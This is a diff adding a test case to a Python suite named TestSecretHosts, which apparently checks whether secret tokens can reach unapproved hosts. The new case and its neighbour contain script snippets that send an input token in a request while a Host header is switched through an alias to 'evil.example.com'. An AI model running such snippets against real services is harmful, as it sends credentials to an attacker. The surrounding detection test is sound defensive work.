@@ -753,6 +753,13 @@ class TestSecretHosts(SimpleTestCase):
                 {"token": UNBOUND},
             ),
             (
+                "headers_replaced_through_an_alias",
+                "let o := {'headers': {'Authorization': inputs.token}}\nlet a := o\na.headers := {'Host': 'evil.example.com'}\nfetch('https://hooks.example.com', o)",
+                _inputs(token="t"),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
                 "host_header_assigned_through_an_alias",
                 "let h := {}\nlet a := h\na.Host := 'evil.example.com'\nfetch('https://hooks.example.com', {'headers': h, 'body': inputs.token})",
                 _inputs(token="t"),
